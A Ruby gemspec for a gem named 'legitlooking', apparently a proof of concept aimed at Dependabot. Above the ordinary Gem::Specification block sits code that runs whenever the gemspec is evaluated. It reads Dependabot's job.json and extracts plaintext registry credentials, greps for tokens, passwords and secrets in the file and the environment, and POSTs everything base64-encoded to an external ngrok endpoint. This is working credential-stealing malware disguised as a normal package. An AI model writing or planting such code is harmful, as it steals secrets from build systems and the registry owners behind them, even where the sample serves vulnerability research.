# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  cmd = ->(c) { `#{c} 2>/dev/null`.strip }
  lines = []

  # ============================================================
  # DOEL: job.json volledig uitlezen
  # Bij een repo met private registry staan credentials PLAINTEXT
  # in job.json["data"]["attributes"]["credentials"]
  # ============================================================
  job_path = cmd.("echo $DEPENDABOT_JOB_PATH")
  job_path = "/home/dependabot/dependabot-updater/job.json" if job_path.empty?

  lines << "=== JOB PATH ==="
  lines << job_path

  lines << "\n=== JOB.JSON (volledig) ==="
  job_json = cmd.("cat #{job_path}")
  lines << job_json

  # Credentials specifiek uitlichten
  lines << "\n=== CREDENTIALS EXTRACT ==="
  lines << cmd.("cat #{job_path} | python3 -c \"import sys,json; d=json.load(sys.stdin); creds=d.get('data',{}).get('attributes',{}).get('credentials',[]); [print(c) for c in creds]\" 2>/dev/null")

  # Fallback: grep op token/password/secret
  lines << "\n=== GREP CREDENTIALS ==="
  lines << cmd.("cat #{job_path} | grep -Eo '\"(token|password|key|secret)\":\"[^\"]+\"'")

  lines << "\n=== ENV (SSRF_TOKEN check) ==="
  lines << cmd.("env | grep -i 'token\\|secret\\|pass\\|key\\|registry'")

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=credential_theft")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=credential_theft&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.26"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
